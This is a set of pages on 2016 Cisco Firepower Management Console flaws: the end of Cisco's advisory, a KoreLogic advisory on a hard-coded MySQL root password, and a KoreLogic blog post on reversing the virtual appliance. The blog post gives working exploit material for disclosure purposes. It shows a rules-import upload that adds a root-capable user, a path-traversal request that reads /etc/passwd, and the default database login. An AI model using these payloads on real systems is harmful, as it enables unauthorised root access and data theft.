Tool](https://bst.cloudapps.cisco.com/bugsearch/bug/BUGID).      When considering software upgrades, customers are advised to regularly consult the advisories for Cisco products, which are available from the [Cisco Security Advisories and Alerts page](http://www.cisco.com/go/psirt), to determine exposure and a complete upgrade solution.      In all cases, customers should ensure that the devices to be upgraded contain sufficient memory and confirm that current hardware and software configurations will continue to be supported properly by the new release. If the information is not clear, customers are advised to contact the Cisco Technical Assistance Center (TAC) or their contracted maintenance providers.  Exploitation and Public Announcements  * The Cisco Product Security Incident Response Team (PSIRT) is not aware of any public announcements or malicious use of the vulnerability that is described in this advisory.  Cisco Security Vulnerability Policy  * To learn about Cisco security vulnerability disclosure policies and publications, see the [Security Vulnerability Policy](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html). This document also contains instructions for obtaining fixed software and receiving security vulnerability information from Cisco.  Subscribe to Cisco Security Notifications  * [Subscribe](https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html)  URL  * <https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20161005-ftmc1>  Revision History  * | Version | Description | Section | Status | Date |   | --- | --- | --- | --- | --- |   | 1.0 | Initial public release. | - | Final | 2016-October-05 |      Show Less  ---   Legal Disclaimer  * THIS DOCUMENT IS PROVIDED ON AN "AS IS" BASIS AND DOES NOT IMPLY ANY KIND OF GUARANTEE OR WARRANTY, INCLUDING THE WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR USE. YOUR USE OF THE INFORMATION ON THE DOCUMENT OR MATERIALS LINKED FROM THE DOCUMENT IS AT YOUR OWN RISK. CISCO RESERVES THE RIGHT TO CHANGE OR UPDATE THIS DOCUMENT AT ANY TIME.  A standalone copy or paraphrase of the text of this document that omits the distribution URL is an uncontrolled copy and may lack important information or contain factual errors. The information in this document is intended for end users of Cisco products.   Feedback  * Leave additional feedback     Cisco Security Vulnerability Policy  * To learn about Cisco security vulnerability disclosure policies and publications, see the [Security Vulnerability Policy](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html). This document also contains instructions for obtaining fixed software and receiving security vulnerability information from Cisco.  Subscribe to Cisco Security Notifications  * [Subscribe](https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html) |        | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | |



=== Content from www.korelogic.com_10a2cc1b_20250126_092025.html ===
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
KL-001-2016-005 : Cisco Firepower Threat Management Console Hard-coded MySQL Credentials
Title: Cisco Firepower Threat Management Console Hard-coded MySQL Credentials
Advisory ID: KL-001-2016-005
Publication Date: 2016.10.05
Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2016-005.txt
1. Vulnerability Details
Affected Vendor: Cisco
Affected Product: Firepower Threat Management Console
Affected Version: Cisco Fire Linux OS 6.0.1 (build 37/build 1213)
Platform: Embedded Linux
CWE Classification: CWE-798: Use of Hard-coded Credentials
Impact: Authentication Bypass
CVE-ID: CVE-2016-6434
2. Vulnerability Description
The root account for the local MySQL database has poor password
complexity.
3. Technical Description
root@firepower:/Volume/6.0.1# mysql -u root --password=admin
Warning: Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor. Commands end with ; or \g.
Your MySQL connection id is 23348
Server version: 5.6.24-enterprise-commercial-advanced-log MySQL Enterprise Server - Advanced Edition (Commercial)
Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.
Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql> show databases;
+--------------------+
| Database |
+--------------------+
| information\_schema |
| Sourcefire |
| external\_data |
| external\_schema |
| mysql |
| performance\_schema |
| sfsnort |
+--------------------+
7 rows in set (0.00 sec)
mysql>
Note that mysqld listens only on loopback, so a remote attacker
would have to leverage some other condition to be able to reach
the mysql daemon.
4. Mitigation and Remediation Recommendation
The vendor has acknowledged this vulnerability
but has not released a fix for the
issue. Vendor acknowledgement available at:
https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20161005-ftmc1
5. Credit
This vulnerability was discovered by Matt Bergin (@thatguylevel)
of KoreLogic, Inc.
6. Disclosure Timeline
2016.06.30 - KoreLogic sends vulnerability report and PoC to Cisco.
2016.06.30 - Cisco acknowledges receipt of vulnerability report.
2016.07.20 - KoreLogic and Cisco discuss remediation timeline for
this vulnerability and for 3 others reported in the
same product.
2016.08.12 - 30 business days have elapsed since the vulnerability was
reported to Cisco.
2016.09.02 - 45 business days have elapsed since the vulnerability was
reported to Cisco.
2016.09.09 - KoreLogic asks for an update on the status of the
remediation efforts.
2016.09.15 - Cisco confirms remediation is underway and soon to be
completed.
2016.09.28 - Cisco informs KoreLogic that the acknowledgement details
will be released publicly on 2016.10.05.
2016.10.05 - Public disclosure.
7. Proof of Concept
See Technical Description
The contents of this advisory are copyright(c) 2016
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/
KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html
Our public vulnerability disclosure policy is available at:
https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.2.txt
-----BEGIN PGP SIGNATURE-----
iQEcBAEBCAAGBQJX9V/0AAoJEE1lmiwOGYkMO98H/iEVd68trY8hwMn6qK+/nueQ
JZkDjSCMRt/rOrTJN5kAbeW6e+lNfQ9csEeGv1DVh3ojpyhiIun1NZYjP2wAjsDc
3vmLvLkO6dWprPI5HI/CTDP8yFS894+4b8BI5RwZqrLEo9rPsypbKMVU9n4wiaIA
j3pLrxLFEcKZxbn953/QI/piIhliNx480sbLBQpSLDsy4E01rqbsneB9O7Pvq2N2
i9+mLcu0LqKVIR3/cJ10D9XKLFnsM+lWuO0l6D5aQXhyhXL46Whrp46wOsJlLHkW
6EbWX/C4+xRI5ENCCJfqecUAWrJqu5aa+zs/z53+o6TIy96ChaZgPx1FYGjzoVg=
=F4/P
-----END PGP SIGNATURE-----


=== Content from blog.korelogic.com_2978d50e_20250125_141832.html ===


[![](/images/korelogo.png)](/)

* [Main](https://korelogic.com)
* [Blog](https://blog.korelogic.com/blog)
* [Contest](https://contest.korelogic.com/)
* [Tools](https://git.korelogic.com)
* [Contact Us](https://korelogic.com/contact.html)

| [Virtual Appliance Spelunking](https://blog.korelogic.com/blog/2016/10/10/virtual_appliance_spelunking) 2016-10-10 15:35 | |
| --- | --- |

Hello again and welcome back. Today I want to talk about a Sunday I
spent reversing the Cisco Firepower Management Console virtual
appliance that resulted in multiple CVEs being issued. The tricks I
will show have worked on four or five other virtual appliances from
other vendors. Results from those are either pending disclosure or
have already been reported by other researchers. Either way, this
should be something you can easily recreate to find vulnerabilities.

Before I start, normally I am just barely satisfied or outright
discouraged by the vendor's response. I want to commend the Cisco team
for their rapid response and great communication. They didn't drag
their feet nor attempt to prevaricate or downplay the findings (as the
below issues all require some level of authenticated access to
leverage). Cisco has issued three CVEs for the vulnerabilities we
disclosed:

* CVE-2016-6433 [KL-001-2016-007](https://www.korelogic.com/Resources/Advisories/KL-001-2016-007.txt)* CVE-2016-6434 [KL-001-2016-005](https://www.korelogic.com/Resources/Advisories/KL-001-2016-005.txt)* CVE-2016-6435 [KL-001-2016-006](https://www.korelogic.com/Resources/Advisories/KL-001-2016-006.txt)

Everything is virtualized nowadays, including appliances. What is
great is that most companies who develop appliances will allow trial
copies of them to be released. Just Google 'Virtual appliance trial
download' and you'll find plenty of targets. I did just that and came
across a trial download for the Cisco Firepower Management Console.

```
(Cisco_Firepower_Management_Center_VMware-6.0.1-1213.tar.gz) = c93e8874bc114bee4ee519f2e361ada52d7fee5f
```

It contained the following files:

```

(Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.vmdk) = 20dbf629a1a550e994226692029fbe6d84f33484
(Cisco_Firepower_Management_Center_Virtual_VMware-ESXi-6.0.1-1213.mf) = 4d1f63d597aa9b10d0b79a070455367fa7bf5716
(Cisco_Firepower_Management_Center_Virtual_VMware-ESXi-6.0.1-1213.ovf) = 8a6de8b9433f9b72e1a6561793b21b771069aabe
(Cisco_Firepower_Management_Center_Virtual_VMware-VI-6.0.1-1213.mf) = 61789395ec52e6d0e1f59c9645fa2ea6acf2f719
(Cisco_Firepower_Management_Center_Virtual_VMware-VI-6.0.1-1213.ovf) = be3f21da5375b092be675c171840707785b98389

```

Once files are extracted from gzip tarball, I converted the vmdk into
a raw file.

```

$ qemu-img convert -f vmdk -O raw Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.vmdk \
	Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw

```

Next, I review the partitions.

```

$ fdisk -l Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw

Disk Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw: 250 GiB, 268435456000 bytes, 524288000 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x423b7500

Device                                                                 Boot    Start       End   Sectors   Size Id Type
Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw1 *        2048    194559    192512    94M 83 Linux
Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw2        194560   2195455   2000896   977M 82 Linux swap / Solaris
Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw3       2195456 524287999 522092544   249G  f W95 Ext'd (LBA)
Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw5       2197504  10008575   7811072   3.7G 83 Linux
Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw6      10008577  17820312   7811736   3.7G 83 Linux
Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw7      17820314 524287999 506467686 241.5G 83 Linux

```

Now I will go through the file content of each Linux partition until I
come across something interesting. Note that fdisk's output is in
512-byte blocks, but the loop offsets below are in bytes, i.e. blocks
\* 512.

```

$ umount /mnt/temp_mnt;mount -o ro,loop,offset=1048576 \
	Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw /mnt/temp_mnt/; \
	ls -la /mnt/temp_mnt/
total 9438
drwxrwxr-x  6 root root    1024 Mar 18 18:34 .
drwxr-xr-x 10 root root    4096 Sep  3 01:13 ..
drwxrwxr-x  2 root root    1024 Mar 18 18:32 boot
-rw-r--r--  1 root root     512 Mar 18 18:34 boot.0800
-rw-r--r--  1 root root 4308496 Mar 18 18:32 bzImage-3.10.53-sf.virtual-26
-rw-r--r--  1 root root  113162 Feb 22  2016 coffee.bmp
-rw-r--r--  1 root root     426 Feb 22  2016 coffee.dat
-rw-r--r--  1 root root   22466 Feb 22  2016 debian.bmp
-rw-r--r--  1 root root     423 Feb 22  2016 debian.dat
-rw-r--r--  1 root root   22560 Feb 22  2016 debian-de.bmp
-rw-r--r--  1 root root     426 Feb 22  2016 debian-de.dat
-rw-r--r--  1 root root   31628 Feb 22  2016 debianlilo.bmp
-rw-r--r--  1 root root     435 Feb 22  2016 debianlilo.dat
drwxrwxr-x  2 root root    1024 Mar 18 18:32 grub
-rw-r--r--  1 root root 2614888 Mar 18 18:33 initrd-3.10.53-sf.virtual-26
-rw-r--r--  1 root root   22578 Feb 22  2016 inside.bmp
-rw-r--r--  1 root root     432 Feb 22  2016 inside.dat
drwxrwxr-x  2 root root    1024 Mar 18 18:32 kernels
drwx------  2 root root   12288 Mar 18 18:31 lost+found
-rw-------  1 root root   82944 Mar 18 18:34 map
-rw-r--r--  1 root root    6878 Feb 22  2016 onlyblue.bmp
-rw-r--r--  1 root root     424 Feb 22  2016 onlyblue.dat
lrwxrwxrwx  1 root root      32 Mar 18 18:32 System.map -> System.map-3.10.53-sf.virtual-26
-rw-r--r--  1 root root 2372553 Mar 18 18:32 System.map-3.10.53-sf.virtual-26
-rw-r--r--  1 root root   33192 Feb 22  2016 tuxlogo.bmp
-rw-r--r--  1 root root     423 Feb 22  2016 tuxlogo.dat
$ umount /mnt/temp_mnt;mount -o ro,loop,offset=1125122048 \
	Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw /mnt/temp_mnt/; \
	ls -la /mnt/temp_mnt/
total 92
drwxr-xr-x 20 root root  4096 Mar 18 18:34 .
drwxr-xr-x 10 root root  4096 Sep  3 01:13 ..
drwxrwxr-x  2 root root  4096 Mar 18 18:33 bin
drwxr-xr-x  2 root root  4096 Mar 18 18:31 boot
drwxr-xr-x  2 root root  4096 Mar 18 18:31 dev
drwxrwxr-x 36 root root  4096 Mar 18 18:34 etc
-rw-r--r--  1 root root     0 Feb 22  2016 .firstboot
drwxr-xr-x  2 root root  4096 Oct  6  1997 home
drwxr-xr-x  5 root root  4096 Mar 18 18:33 lib
drwxrwxr-x  3 root root  4096 Mar 18 18:33 lib64
drwx------  2 root root 16384 Mar 18 18:31 lost+found
drwxr-xr-x  5 root root  4096 Mar 15  2002 mnt
drwxr-xr-x  2 root root  4096 Mar 18 18:34 opt
drwxr-xr-x  2 root root  4096 Mar 18 18:31 proc
-rw-r--r--  1 root root     0 Mar 18 18:33 .reconfigure
drwx------  2 root root  4096 Mar 18 18:34 root
drwxrwxr-x  2 root root  4096 Feb 22  2016 sbin
drwxr-xr-x  2 root root  4096 Mar 18 18:31 sys
drwxrwxrwt  2 root root  4096 Mar 18 18:34 tmp
drwxr-xr-x 19 root root  4096 Dec 14  2015 usr
drwxr-xr-x  2 root root  4096 Mar 18 18:31 var
drwxr-xr-x  2 root root  4096 Mar 18 18:31 Volume

```

So, partition 1 is /boot, and partition 5 looks like /. After
browsing the filesystems a bit, I noticed the www user has a sudoers
entry for the useradd binary.

```

$ grep useradd etc/sudoers
www     ALL = NOPASSWD: /usr/sbin/useradd

```

Additionally, I noticed that there is a group whose users can execute
any command as root. By default, only the admin user can do so.

```

$ grep ldapgroup etc/sudoers
%ldapgroup ALL = (ALL) ALL
$ grep ldapgroup etc/group
ldapgroup::201:admin

```

The useradd binary from the appliance has the flag -g which allows you
to specify which group to place a newly created user into. It also
supports specifying the new user's password hash on the command line.

```

Usage: useradd [options] LOGIN

Options:
  -b, --base-dir BASE_DIR       base directory for the home directory of the
                                new account
  -c, --comment COMMENT         GECOS field of the new account
  -d, --home-dir HOME_DIR       home directory of the new account
  -D, --defaults                print or change default useradd configuration
  -e, --expiredate EXPIRE_DATE  expiration date of the new account
  -f, --inactive INACTIVE       password inactivity period of the new account
  -g, --gid GROUP               name or ID of the primary group of the new
                                account
[snip]
  -p, --password PASSWORD       encrypted password of the new account
[snip]

```
Therefore, if I could get the www user to run a specific command I
could get root. Here is the command:

```

sudo useradd -g ldapgroup -p `openssl passwd -1 <password>` <username>

```

The management web application maintains ten separate security roles.
Only two of those roles can update IDS signature rules. The two roles
are: Administrator, and Intrusion Administrator. With the exception of
the Administrator user, none of these groups afford the user shell
access.

Oddly enough, the target appliance uses a shell script to do the IDS
rule update. I tried the following:

```

POST /DetectionPolicy/rules/rulesimport.cgi?no_mojo=1 HTTP/1.1
[snip]
Cookie: CGISESSID=2ee7e6f19a104f4453e201f26fdbd6f3
[snip]
-----------------------------15519792567789791301241925798
Content-Disposition: form-data; name="file"; filename="exploit.sh"
Content-Type: application/octet-stream

sudo useradd -g ldapgroup -p `openssl passwd -1 korelogic` korelogic
[snip]

HTTP/1.1 200 OK
Date: Fri, 30 Sep 2016 21:43:14 GMT
Server: Apache
Vary: Accept-Encoding
X-Frame-Options: SAMEORIGIN
Content-Length: 49996
Connection: close
Content-Type: text/html; charset=utf-8

[snip]

```

Everything in the application looked like it had worked out
successfully. So, I tried to ssh.

```

$ ssh korelogic@1.3.3.7
Password:
Last login: Sat Oct  1 02:21:00 2016 from 1.3.3.7

Copyright 2004-2016, Cisco and/or its affiliates. All rights reserved.
Cisco is a registered trademark of Cisco Systems, Inc.
All other trademarks are property of their respective owners.

Cisco Fire Linux OS v6.0.1 (build 37)
Cisco Firepower Management Center for VMWare v6.0.1 (build 1213)

Could not chdir to home directory /Volume/home/korelogic: No such file or directory
korelogic@firepower:/$ sudo su -
Password:
root@firepower:~# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)

```

A full exploit can be found [here](https://blog.korelogic.com/2016/10/10/virtual_appliance_spelunking/kl-cisco-firepower-rce.py).

This was issued CVE-2016-6433.

I also found a few other noteworthy things during the time I spent
playing with the target appliance. There is a report function that
contains a local file inclusion vulnerability.

```

GET /events/reports/view.cgi?download=1&files=../../../etc/passwd%00 HTTP/1.1
Host: [redacted]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Cookie: CGISESSID=2ee7e6f19a104f4453e201f26fdbd6f3
Connection: close

HTTP/1.1 200 OK
Date: Fri, 22 Apr 2016 23:58:41 GMT
Server: Apache
Content-Disposition: attachment; filename=passwd
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Type: application/octet-stream
Content-Length: 623

root:x:0:0:Operator:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
mysql:x:27:27:MySQL:/var/lib/mysql:/sbin/nologin
nobody:x:99:99:nobody:/:/sbin/nologin
sshd:x:33:33:sshd:/:/sbin/nologin
www:x:67:67:HTTP server:/var/www:/sbin/nologin
sfrna:x:88:88:SF RNA User:/Volume/home/sfrna:/sbin/nologin
snorty:x:90:90:Snorty User:/Volume/home/snorty:/sbin/nologin
sfsnort:x:95:95:SF Snort User:/Volume/home/sfsnort:/sbin/nologin
sfremediation:x:103:103::/Volume/home/remediations:/sbin/nologin
admin:x:100:100::/Volume/home/admin:/bin/sh
casuser:x:101:104:CiscoUser:/var/opt/CSCOpx:/bin/bash

```

This was issued CVE-2016-6435.

The root acount of a local MySQL database where most everything
resides is protected with the password "admin".

```

root@firepower:/Volume/6.0.1# mysql -u root --password=admin
Warning: Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 23348
Server version: 5.6.24-enterprise-commercial-advanced-log MySQL Enterprise Server - Advanced Edition (Commercial)

Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Sourcefire         |
| external_data      |
| external_schema    |
| mysql              |
| performance_schema |
| sfsnort            |
+--------------------+
7 rows in set (0.00 sec)

mysql>

```

This listener is not externally exposed, but still using a static
password of 'admin' is not a great idea.

This was issued CVE-2016-6434.

We also found a denial-of-service for the web application management
interface. That's not as exciting though, I won't go into details on
it here but information regarding it can be found on our [advisory
page](https://www.korelogic.com/Resources/Advisories/KL-001-2016-005.txt).

That's all I have for now. Thanks for reading!

| 0 comments *Posted by Matt at: 15:35  [permalink](https://blog.korelogic.com/blog/2016/10/10/virtual_appliance_spelunking)* | |
| --- | --- |

Comments are closed for this story.

* [Twitter](https://twitter.com/CrackMeIfYouCan)
* [GitHub](https://github.com/korelogicsecurity)
* [LinkedIn](https://www.linkedin.com/company/korelogic)

Copyright 2024. KoreLogic Security. All rights reserved


